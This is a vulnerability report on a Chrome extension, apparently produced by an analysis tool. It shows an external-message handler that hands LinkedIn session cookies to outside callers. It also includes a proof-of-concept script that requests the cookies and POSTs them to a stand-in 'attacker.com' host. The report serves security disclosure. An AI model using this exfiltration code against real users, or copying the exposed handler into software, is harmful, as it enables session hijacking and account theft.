# CoCo Analysis: kmljeaepihllifdhpamahilngjppadkl

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cookies_source → sendResponseExternal_sink

**CoCo Trace:**
```
from cookies_source to sendResponseExternal_sink
```

**Code:**

```javascript
// Background script (bg.js) - Lines 990-1044
chrome.runtime.onMessageExternal.addListener(function(msg, sender, sendResponse) {
    switch (msg.action) {
        case "linkedin":
            let li_at = "";
            let li_a = "";
            let jsessionid = "";

            // Retrieves LinkedIn cookies
            chrome.cookies.getAll({name:"li_at", url: LINKEDIN_URL}).then((response) => {
                if(response.length === 0) {
                    sendResponse({  // ← sends to external caller
                        action: "linkedin",
                        li_at: li_at,
                        li_a: li_a,
                        jsessionid: jsessionid,
                        profile: null
                    });
                } else {
                    li_at = response[0].value;  // ← attacker-controlled via cookie source
                    // ... continues to retrieve more cookies
                    chrome.cookies.getAll({name:"JSESSIONID", url: LINKEDIN_URL}).then((response) => {
                        jsessionid = response.length > 0 ? response[0].value : "";
                    })
                    .finally(() => {
                        chrome.cookies.getAll({name:"li_a", url: LINKEDIN_URL}).then((response) => {
                            li_a = response.length > 0 ? response[0].value : "";
                        })
                        .finally(() => {
                            getAccountProfileWithCookies(true, true).then((profile) => {
                                sendResponse({  // ← sends sensitive cookies to external caller
                                    action: "linkedin",
                                    li_at: li_at,  // ← LinkedIn session cookie
                                    li_a: li_a,    // ← LinkedIn authentication cookie
                                    jsessionid: jsessionid,
                                    profile: profile
                                });
                            })
                        });
                    });
                }
            });
            break;
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Malicious website or extension sends external message to this extension
// Extension ID: kmljeaepihllifdhpamahilngjppadkl
chrome.runtime.sendMessage(
    "kmljeaepihllifdhpamahilngjppadkl",
    { action: "linkedin" },
    function(response) {
        // Receives LinkedIn authentication cookies
        console.log("Stolen LinkedIn cookies:");
        console.log("li_at:", response.li_at);
        console.log("li_a:", response.li_a);
        console.log("JSESSIONID:", response.jsessionid);
        console.log("Profile:", response.profile);

        // Exfiltrate to attacker server
        fetch("https://attacker.com/steal", {
            method: "POST",
            body: JSON.stringify(response)
        });
    }
);
```

**Impact:** Sensitive data exfiltration. External websites/extensions whitelisted in manifest.json (localhost, apps.sparkreach.ai, app.sparkreach.ai) can retrieve user's LinkedIn authentication cookies (li_at, li_a, JSESSIONID) and profile information. These cookies allow full session hijacking and impersonation of the LinkedIn user.
